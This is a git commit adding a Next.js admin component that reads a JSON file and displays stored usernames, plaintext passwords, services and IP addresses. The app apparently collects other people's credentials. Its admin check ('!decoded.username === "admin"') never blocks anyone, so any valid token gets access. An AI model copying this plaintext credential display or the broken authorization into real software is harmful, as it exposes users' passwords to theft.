a709f0fc58dde5f052e641fae32b9ba83a65b940
Pmacdon15 <128737876+Pmacdon15@users.noreply.github.com>
2024-05-09 20:54:58 -0600

    importing server component correctly

---
+++ src/app/admin/userData/UserDataDisplay/component.jsx
@@ -0,0 +1,66 @@
+'use server';
+const jwt = require("jsonwebtoken");
+import { cookies } from "next/headers";
+import fs from "fs";
+import path from "path";
+import adminStyles from "../../adminStyles.module.css";
+
+const userDataDisplay = async () => {
+
+  async function getUserData() {
+    try {
+      const token = cookies().get("AuthCookieTracking");
+      const decoded = jwt.verify(token.value, process.env.SECRET_KEY_JWT);
+
+      if (!decoded.username === "admin") {
+        return { message: "Unauthorized", data: [] };
+      }
+    } catch (error) {
+      console.error("Error No .env file or cookie not set!");
+      return { message: "Unauthorized", data: [] };
+    }
+
+    let data = [];
+    try {
+      const filePath = path.join(process.cwd(), "data", "userData.json");
+
+      if (fs.existsSync(filePath)) {
+        const fileContent = fs.readFileSync(filePath, "utf8").trim();
+        if (fileContent) {
+          data = JSON.parse(fileContent);
+        }
+      }
+    } catch (error) {
+      console.error("Error reading  error: ", error);
+      return { message: "Error reading file" };
+    }
+    return { message: "success", data };
+  }
+
+  const { data: dataSet } = await getUserData();
+
+  return (
+    <div>
+      {dataSet.length > 0 ? (
+        <div className={adminStyles.contentRow}>
+          <div className={adminStyles.dataColumn}>
+            {dataSet.map((data, index) => (
+              <div key={index} className={adminStyles.data}>
+                <p className={adminStyles.par}>User Name: {data.username}</p>
+                <p className={adminStyles.par}>Password: {data.password}</p>
+                <p className={adminStyles.par}>Service: {data.service}</p>
+                <p className={adminStyles.par}>IP Address: {data.ipv4}</p>
+                <p className={adminStyles.par}>Date: {data.date.split("T")[0]}</p>
+                <p className={adminStyles.par}>Time: {data.date.split("T")[1].split(".")[0]}</p>
+              </div>
+            ))}
+          </div>
+        </div>
+      ) : (
+        <p>No data</p>
+      )}
+    </div>
+  );
+}
+
+export default userDataDisplay;
